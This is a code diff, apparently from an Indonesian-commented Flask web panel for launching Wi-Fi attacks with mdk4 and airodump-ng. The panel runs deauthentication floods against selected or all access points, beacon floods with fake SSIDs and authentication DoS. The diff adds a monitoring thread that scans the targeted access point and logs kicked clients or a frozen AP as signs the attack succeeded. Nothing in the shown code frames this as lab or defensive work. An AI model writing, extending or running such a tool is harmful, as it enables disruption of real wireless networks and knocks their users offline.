@@ -20,6 +20,14 @@ attack_process = None
 attack_running = False
 attack_type = None
 current_targets = []
+monitor_thread = None
+monitor_running = False
+monitor_data = {
+    "clients": [],
+    "ap_status": "unknown",
+    "packets_sent": 0,
+    "last_update": None
+}
 
 # ====================== FUNGSI MANAJEMEN INTERFACE ======================
 
@@ -98,17 +106,156 @@ def get_monitor_interface():
             return monitor_iface
     return ensure_monitor_mode()
 
-def set_channel(iface, channel):
-    try:
-        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
-        return True
-    except:
-        return False
-
 # ====================== PARSE CSV ======================
 
 def parse_csv(filename):
     """Parse airodump-ng CSV output file"""
+    networks = []
+    clients = []
+    try:
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+    except FileNotFoundError:
+        return networks, clients
+
+    parsing_networks = False
+    parsing_clients = False
+    
+    for line in lines:
+        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
+            parsing_networks = True
+            parsing_clients = False
+            continue
+        if "station mac" in line.lower():
+            parsing_networks = False
+            parsing_clients = True
+            continue
+        if line.strip() == "":
+            continue
+            
+        if parsing_networks:
+            parts = line.split(',')
+            if len(parts) >= 14:
+                bssid = parts[0].strip()
+                channel = parts[3].strip()
+                essid = parts[13].strip()
+                power_str = parts[8].strip() if len(parts) > 8 else ''
+                try:
+                    power = int(power_str)
+                except:
+                    power = None
+                if bssid and len(bssid) == 17 and ":" in bssid:
+                    networks.append({
+                        "bssid": bssid,
+                        "channel": channel if channel else "?",
+                        "essid": essid if essid else "[Hidden]",
+                        "power": power
+                    })
+        
+        if parsing_clients:
+            parts = line.split(',')
+            if len(parts) >= 6:
+                bssid = parts[0].strip()
+                station = parts[1].strip() if len(parts) > 1 else ""
+                power = parts[2].strip() if len(parts) > 2 else ""
+                if bssid and len(bssid) == 17 and ":" in bssid:
+                    clients.append({
+                        "bssid": bssid,
+                        "station": station,
+                        "power": power
+                    })
+    
+    return networks, clients
+
+# ====================== MONITORING THREAD ======================
+
+def monitor_loop():
+    """Loop monitoring target AP untuk cek client dan status"""
+    global monitor_running, monitor_data
+    
+    print("[*] Monitoring thread started")
+    monitor_running = True
+    
+    while monitor_running:
+        try:
+            # Cek apakah ada target yang dimonitor
+            if not current_targets:
+                time.sleep(2)
+                continue
+            
+            # Ambil target pertama (untuk monitoring)
+            target = current_targets[0]
+            bssid = target['bssid']
+            
+            # Scan dengan airodump-ng
+            temp_file = "/tmp/monitor_output"
+            cmd = f"sudo timeout 3 airodump-ng {monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
+            subprocess.run(cmd, shell=True, capture_output=True)
+            
+            # Parse hasil
+            csv_file = f"{temp_file}-01.csv"
+            if os.path.exists(csv_file):
+                networks, clients = parse_csv(csv_file)
+                
+                # Update monitor data
+                monitor_data["clients"] = clients
+                monitor_data["ap_status"] = "online" if networks else "offline/freeze"
+                monitor_data["last_update"] = time.time()
+                
+                # Log jika ada perubahan
+                if len(clients) == 0 and monitor_data.get("previous_clients", 0) > 0:
+                    add_log_monitor(f"🔥 ALL CLIENTS DISCONNECTED! AP mungkin DOWN!", "error")
+                elif len(clients) < monitor_data.get("previous_clients", 0):
+                    add_log_monitor(f"⚠️ {monitor_data.get('previous_clients', 0) - len(clients)} client(s) kicked!", "warning")
+                elif len(clients) > monitor_data.get("previous_clients", 0):
+                    add_log_monitor(f"📡 {len(clients) - monitor_data.get('previous_clients', 0)} client(s) connected", "info")
+                
+                monitor_data["previous_clients"] = len(clients)
+                
+                # Hapus file temporary
+                try:
+                    os.remove(csv_file)
+                except:
+                    pass
+            
+            # Cek apakah AP masih ada di scan (freeze check)
+            if not networks:
+                monitor_data["ap_status"] = "⚠️ AP OFFLINE / FREEZE!"
+                add_log_monitor("🚨 AP TIDAK TERDETEKSI! (FREEZE/CRASH)", "error")
+            else:
+                monitor_data["ap_status"] = "✅ AP Online"
+            
+        except Exception as e:
+            print(f"[-] Monitor error: {e}")
+        
+        time.sleep(3)  # Update setiap 3 detik
+
+def add_log_monitor(message, type="info"):
+    """Tambahkan log ke console Flask"""
+    print(f"[Monitor] {message}")
+
+def start_monitor_thread():
+    """Start monitoring thread"""
+    global monitor_thread, monitor_running
+    if monitor_thread and monitor_thread.is_alive():
+        return
+    monitor_running = True
+    monitor_thread = threading.Thread(target=monitor_loop)
+    monitor_thread.daemon = True
+    monitor_thread.start()
+
+def stop_monitor_thread():
+    """Stop monitoring thread"""
+    global monitor_running, monitor_thread
+    monitor_running = False
+    if monitor_thread:
+        monitor_thread.join(timeout=2)
+        monitor_thread = None
+
+# ====================== PARSE CSV ======================
+
+def parse_csv_scan(filename):
+    """Parse airodump-ng CSV output file untuk scan"""
     networks = []
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
@@ -171,7 +318,7 @@ def scan_wifi():
         networks = []
         for f in possible_files:
             if os.path.exists(f):
-                networks = parse_csv(f)
+                networks = parse_csv_scan(f)
                 if networks:
                     break
         
@@ -204,6 +351,15 @@ def get_interfaces():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
+@app.route('/monitor_data', methods=['GET'])
+def get_monitor_data():
+    """Get real-time monitoring data"""
+    global monitor_data
+    return jsonify({
+        "status": "success",
+        "data": monitor_data
+    })
+
 @app.route('/start_mdk4', methods=['POST'])
 def start_mdk4():
     global attack_process, attack_running, attack_type, current_targets
@@ -225,7 +381,6 @@ def start_mdk4():
     
     if attack_type == 'deauth':
         if targets and len(targets) > 0:
-            # Multiple target via file
             target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
             try:
                 for target in targets:
@@ -241,7 +396,6 @@ def start_mdk4():
             except Exception as e:
                 return jsonify({"status": "error", "message": str(e)})
         else:
-            # All targets mode
             cmd = [
                 "sudo", "mdk4", interface, "d",
                 "-c", "h",
@@ -250,7 +404,6 @@ def start_mdk4():
             current_targets = []
             
     elif attack_type == 'beacon':
-        # Beacon doesn't need targets - auto deselect all
         ssid_file = find_ssid_file()
         if not ssid_file:
             return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
@@ -261,15 +414,11 @@ def start_mdk4():
             "-m",
             "-s", "500"
         ]
-        current_targets = []  # Auto clear targets
+        current_targets = []
         
     elif attack_type == 'authdos':
-        # 🔥 FIX: Auth DOS hanya support 1 target!
         if targets and len(targets) > 0:
-            # Ambil target pertama saja
             target = targets[0]
-            
-            # Kasih warning kalau lebih dari 1 target
             if len(targets) > 1:
                 warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
                 print(f"[!] {warning_msg}")
@@ -280,7 +429,7 @@ def start_mdk4():
                 "-a", target['bssid'],
                 "-s", "1000"
             ]
-            current_targets = [target]  # Hanya 1 target
+            current_targets = [target]
         else:
             return jsonify({"status": "error", "message": "Auth DOS requires 1 target"})
     
@@ -292,6 +441,10 @@ def start_mdk4():
         attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
         attack_running = True
         
+        # Start monitoring thread
+        if current_targets:
+            start_monitor_thread()
+        
         response = {
             "status": "success",
             "message": f"MDK4 {attack_type} started",
@@ -299,7 +452,6 @@ def start_mdk4():
             "target_count": len(current_targets)
         }
         
-        # Tambahkan warning jika ada
         if warning_msg:
             response["warning"] = warning_msg
             response["ignored"] = len(targets) - 1
@@ -324,8 +476,17 @@ def stop_attack():
         except:
             pass
         attack_process = None
-    # Bersihkan proses MDK4 yang masih jalan
     subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
+    
+    # Stop monitoring
+    stop_monitor_thread()
+    global monitor_data
+    monitor_data = {
+        "clients": [],
+        "ap_status": "unknown",
+        "packets_sent": 0,
+        "last_update": None
+    }
 
 @app.route('/attack_status', methods=['GET'])
 def attack_status():
@@ -338,7 +499,6 @@ def attack_status():
     })
 
 def find_ssid_file():
-    """Cari file ssid_list.txt"""
     script_dir = os.path.dirname(os.path.abspath(__file__))
     possible_paths = [
         os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
@@ -354,6 +514,7 @@ def find_ssid_file():
 def cleanup():
     print("\n[*] Cleaning up...")
     stop_attack()
+    stop_monitor_thread()
     if monitor_iface:
         stop_monitor_mode(monitor_iface)
     print("[+] Cleanup complete.")
